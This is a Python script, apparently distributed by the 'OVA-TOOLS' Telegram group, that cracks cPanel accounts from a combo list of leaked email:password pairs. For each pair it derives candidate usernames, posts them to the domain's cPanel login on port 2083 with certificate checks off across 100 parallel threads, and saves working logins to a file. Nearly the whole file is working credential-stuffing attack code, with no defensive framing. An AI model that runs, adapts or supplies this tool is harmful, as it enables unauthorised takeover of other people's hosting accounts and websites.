import sys
import requests
import os
import time
from multiprocessing.dummy import Pool
from colorama import Fore, init
from tabulate import tabulate

# Initialize colorama
init(autoreset=True)

# Define color codes
fr = Fore.RED
fc = Fore.CYAN
fw = Fore.WHITE
fg = Fore.GREEN
fm = Fore.MAGENTA
fy = Fore.YELLOW
fb = Fore.BLUE
fs = Fore.RESET

# Disable warnings
requests.urllib3.disable_warnings()

def log():
    log_text = """
  [#] Created By ::

   ______      __       _______ ____   ____  _       _____ 
  / __ \ \    / /\     |__   __/ __ \ / __ \| |     / ____|
 | |  | \ \  / /  \ ______| | | |  | | |  | | |    | (___  
 | |  | |\ \/ / /\ \______| | | |  | |  | | | |     \___ \ 
 | |__| | \  / ____ \     | | | |__| | |__| | |____ ____) |
  \____/   \/_/    \_\    |_|  \____/ \____/|______|_____/ 
                          OVA-TOOLS  https://t.me/ovacloud                          

"""

    options = [
        ["[*]", "Crack cPanel from Combo List"],
    ]

    # Color codes
    color_codes = {
        "1": Fore.RED,
    }

    colored_options = [[color_codes.get(opt[0], Fore.WHITE) + opt[0], opt[1]] for opt in options]

    table = tabulate(colored_options, headers=["Option", "Description"], tablefmt="orgtbl")

    # Print the table
    for line in log_text.split("\n"):
        print(line)
        time.sleep(0.15)

    print(table)
    print('\n')

def URLdomain_Ova(site):
    if site.startswith("http://"):
        site = site.replace("http://", "")
    elif site.startswith("https://"):
        site = site.replace("https://", "")
    if 'www.' in site:
        site = site.replace("www.", "")
    if '/' in site:
        site = site.rstrip().split('/')[0]
    return site

def CpanelChecker_ova(c):
    try:
        c = c.split(':')
        email = c[0]
        pwd = c[1]
        domain = URLdomain_Ova(email.split('@')[1])
        user1 = domain.split('.')[0]
        user2 = domain.replace(".", "")
        user4 = email.split('@')[0]
        user4s = email.replace("@", "")

        users = [user4]
        
        if len(user1) > 8:
            user3 = user1[:8]
            users.append(user3)

        cp = None 

        for user in users:
            try:
                postlogin = {'user': user, 'pass': pwd, 'login_submit': 'Log in', 'goto_uri': '/'}
                login = requests.post('https://{}:2083/login/'.format(domain), verify=False, data=postlogin, timeout=15).content
            except requests.RequestException:
                login = requests.post('https://{}:2083/login/'.format(domain), data=postlogin, timeout=15).content


            if 'lblDomainName' in login:
                cp = 'https://{}:2083|{}|{}'.format(domain, user, pwd)
                with open('cPanels.txt', 'a') as file:
                    file.write(cp + '\n')
                print('[Work] {}{} ---> [cPanel]'.format(fy, cp))
                break  
            else:
                print('[Not Work]'+'https://{}:2083|{}|{}'.format(domain, user, pwd)+ ' ---> [cPanel]'.format(fr, cp))

                
    except Exception as e:
        print("[Error] Support : https://t.me/Ovatools".format(e))

def exploit(c):
    try:
        c = c.strip()
        CpanelChecker_ova(c)
    except Exception as e:
        print("[Error] Support : https://t.me/Ovatools".format(e))

def run():
    log()
    target = None
    try:
        target = open(sys.argv[1], 'r')
    except IndexError:
        print("\n{}[!] Combolist example format -> site-name@domain.com:password ".format(fr))
        yList = raw_input('\n Input Combolist --> ')
        if not os.path.isfile(yList):
            print("\n   {}({}) File does not exist!\n".format(fr, yList))
            sys.exit(0)
        target = open(yList, 'r')
    except IOError as e:
        print("\n{}[!] Error opening file: {}".format(fr, e))
        sys.exit(0)

    if target:
        with target:
            mp = Pool(100)
            mp.map(exploit, target)
            mp.close()
            mp.join()

if __name__ == "__main__":
    run()
